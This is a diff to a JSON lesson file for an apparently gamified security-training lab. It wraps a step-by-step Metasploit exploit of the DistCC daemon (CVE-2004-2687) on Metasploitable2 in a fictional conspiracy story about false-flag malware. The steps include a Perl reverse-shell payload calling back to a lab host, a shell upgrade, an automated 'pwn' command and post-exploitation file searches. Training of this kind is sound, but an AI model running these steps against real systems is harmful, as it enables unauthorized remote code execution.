@@ -7,88 +7,104 @@
   "port": 3632,
   "short_description": "Exploit the DistCC daemon for remote code execution on Metasploitable2.",
   "description": "Metasploitable2 is a deliberately vulnerable Linux VM created by Rapid7 for security training. The DistCC (Distributed C Compiler) daemon allows remote code execution due to a misconfiguration. This is CVE-2004-2687.",
+
+  "episode_number": 5,
+  "episode_title": "THE BUILD FARM",
+  "next_episode_id": "dvwa-command-injection",
+
+  "handler_message": "The executive files mentioned a 'build farm' - distributed infrastructure for compiling SCADA-BRIDGE at scale.\n\nWe've traced it to 172.20.0.20. They're running DistCC - distributed compilation. The daemon is misconfigured. CVE-2004-2687. Remote code execution through the compilation request itself.\n\nThis is where they're building the weapon. The binaries. The payloads. Everything that will be deployed when NIGHTFALL goes live.\n\nGet inside. See what they're creating. And look for the false flag markers - the Chinese attribution they're planting in the code.",
+
+  "episode_intro": "They're not just planning an attack. They're manufacturing evidence.\n\nThe executive files showed wire transfers, authorization chains, surveillance photos of David Chen. But the build farm is where theory becomes reality.\n\nDistributed compilation. Dozens of machines working together to create something. SCADA-BRIDGE isn't a single tool - it's a suite. And somewhere in that compiled code, they've buried the breadcrumbs that will point to Beijing.\n\nMandarin error strings. IP addresses in Chinese netblocks. Compiler artifacts that look like they came from a Chinese APT.\n\nThis is how you frame a nation for an attack you committed yourself.",
+
+  "episode_outro": "The build artifacts tell the story.\n\nYou find compiled binaries with Chinese language strings embedded throughout. Error messages in simplified Mandarin. Debug symbols pointing to /home/li_wei/ - a username that doesn't exist on any Cerberus system.\n\nHardcoded IP addresses in the 202.x.x.x range - Chinese telecom netblocks. Compilation timestamps adjusted to Beijing time zone. Malware signatures that match known Chinese APT tools.\n\nEvery piece of evidence screams 'China did this.' And every piece is fake.\n\nWhen NIGHTFALL hits - when power grids fail and water systems go haywire - investigators will find these breadcrumbs. They'll write reports. Congress will demand action. And nobody will question the evidence because it looks exactly like what they expect to see.\n\nYou have the truth. But you're running out of time to prove it.\n\nThe public-facing portal might have more - customer lists, transactions, the money flow that connects NIGHTFALL to its beneficiaries.",
+
+  "interstitial": {
+    "title": "Episode 5: THE BUILD FARM",
+    "content": "PREVIOUSLY: The executive file shares revealed the full scope of Cerberus's conspiracy. Authorization documents. Wire transfers to shell companies. Surveillance photos of David Chen before his disappearance.\n\nBut documents don't launch cyberattacks. Someone has to build the weapon.\n\nThe files referenced a 'build farm' - distributed compilation infrastructure at 172.20.0.20. DistCC daemon, misconfigured and exploitable.\n\nThis is where SCADA-BRIDGE is being assembled. And if your handler is right, it's where you'll find the false flag evidence - the Chinese attribution markers that will start a war."
+  },
+
   "steps": [
     {
       "title": "Quick scan for DistCC port",
       "command": "nmap -sV -p 3632 172.20.0.20",
-      "explanation": "Check if DistCC is running on the default port. Use this instead of a full port scan to save time.",
+      "narrative": "DistCC runs on port 3632 by default. It's designed for distributed compilation - spreading compile jobs across multiple machines. Useful for large codebases. Dangerous when misconfigured. Cerberus is using it to build something at scale.",
       "expected": "3632/tcp open  distccd",
       "duration": "5-10 sec"
     },
     {
       "title": "Optional: Full port scan",
       "command": "nmap -sV -p- 172.20.0.20 --open",
-      "explanation": "Full port scan to discover ALL services. Metasploitable2 has many vulnerable services. WARNING: This takes a long time!",
+      "narrative": "Metasploitable2 is intentionally vulnerable - it runs dozens of exploitable services. A full scan reveals the attack surface. In a real engagement, this reconnaissance would identify multiple paths to compromise. We're focusing on DistCC for this mission.",
       "expected": "Many open ports including 21, 22, 23, 80, 3632, etc.",
       "duration": "3-5 min"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "Launch Metasploit Framework in quiet mode.",
+      "narrative": "DistCC's vulnerability is elegant in its simplicity. The daemon accepts compilation requests but doesn't validate the commands embedded within them. You can send arbitrary code disguised as a compile job. Metasploit makes this trivial.",
       "duration": "5-15 sec"
     },
     {
       "title": "Search for DistCC exploits",
       "command": "search distcc",
-      "explanation": "Find exploits for the DistCC service.",
+      "narrative": "CVE-2004-2687. Two decades old and still finding targets. The DistCC daemon was designed for trusted networks - it never expected to face malicious input. Cerberus should know better than to expose it.",
       "expected": "exploit/unix/misc/distcc_exec",
       "duration": "1-2 sec"
     },
     {
       "title": "Load the DistCC exploit",
       "command": "use exploit/unix/misc/distcc_exec",
-      "explanation": "Select the DistCC remote code execution module."
+      "narrative": "This module exploits the command execution vulnerability in DistCC. It sends a malformed compilation request containing shell commands. The daemon executes them. No authentication required. No special privileges needed."
     },
     {
       "title": "View options",
       "command": "show options",
-      "explanation": "Check required parameters. RHOSTS (target) and LHOST (your IP for reverse shell) are needed."
+      "narrative": "Standard exploitation parameters. RHOSTS for the target, LHOST for your callback address. The payload will need to connect back to you - make sure your IP is reachable from the target network."
     },
     {
       "title": "Set the target host",
       "command": "set RHOSTS 172.20.0.20",
-      "explanation": "Point the exploit at Metasploitable2."
+      "narrative": "The build farm. Whatever Cerberus is compiling - SCADA-BRIDGE, false flag artifacts, the entire NIGHTFALL toolkit - it's being assembled here. Access to the build system means access to their creation."
     },
     {
       "title": "Set your attack machine IP",
       "command": "set LHOST 172.20.0.5",
-      "explanation": "This is the Kali container's IP for the reverse shell connection."
+      "narrative": "Your Kali machine's IP on the lab network. When the payload executes, it opens a reverse connection back to this address. Metasploit will be listening, ready to catch the shell."
     },
     {
       "title": "Set the payload",
       "command": "set PAYLOAD cmd/unix/reverse_perl",
-      "explanation": "Use a Perl reverse shell payload (more reliable than bash on older systems)."
+      "narrative": "Perl reverse shell - reliable on older systems like Metasploitable2. The payload is compact, uses commonly installed interpreters, and establishes a bidirectional connection. Once it runs, you have command execution on the build farm."
     },
     {
       "title": "Run the exploit",
       "command": "run",
-      "explanation": "Execute the exploit and get a shell.",
+      "narrative": "Execution. The malformed compilation request travels to the DistCC daemon. The embedded commands execute. A reverse shell connects back to your machine. You're now inside Cerberus's build infrastructure.",
       "expected": "Command shell session opened",
       "duration": "2-5 sec"
     },
     {
-      "title": "Check your access (no prompt - just type!)",
+      "title": "Check your access",
       "command": "id",
-      "explanation": "No prompt will appear - just type and press Enter! See what user you're running as.",
+      "narrative": "No prompt appears - just a blinking cursor. Type 'id' and press Enter. The DistCC daemon typically runs as a low-privileged user like 'daemon'. You have code execution, but not root. Enough to explore the build artifacts.",
       "expected": "uid=1(daemon)"
     },
     {
-      "title": "Upgrade shell (no prompt - just type!)",
+      "title": "Upgrade shell",
       "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
-      "explanation": "No prompt will appear - just type and press Enter! Get a proper interactive shell for privilege escalation."
+      "narrative": "Spawn a proper terminal for easier navigation. Python's pty module creates an interactive shell with tab completion and proper signal handling. Much more comfortable for exploration and evidence gathering."
     },
     {
-      "title": "One-command pwn (after you learn it)",
+      "title": "One-command pwn",
       "command": "pwn distcc",
-      "explanation": "Exit the shell (type 'exit' twice) and try this. Now that you understand the attack, this script runs it automatically."
+      "narrative": "The automated script handles the full exploit chain. Use it for repeated access or demonstrations. But remember: you're not just practicing exploitation. You're gathering evidence of an impending attack."
     }
   ],
   "pwn_command": "pwn distcc",
-  "success_criteria": "You have a command shell on Metasploitable2. Run 'id' and 'hostname' to confirm you're on the target system.",
+  "success_criteria": "You have a shell on the Cerberus build farm. You can examine compiled artifacts and search for false flag evidence.",
   "next_steps": [
-    "Try other Metasploitable2 services: vsftpd, Samba, IRC",
-    "Explore privilege escalation with 'search post/multi/recon/local_exploit_suggester'",
-    "Use 'background' to keep the session and attack other services"
+    "Find compiled binaries: find / -name '*.so' -o -name '*.exe' 2>/dev/null",
+    "Search for Chinese strings: grep -r 'error' /opt/ | grep -i chinese",
+    "Check build logs: cat /var/log/distcc*"
   ]
 }
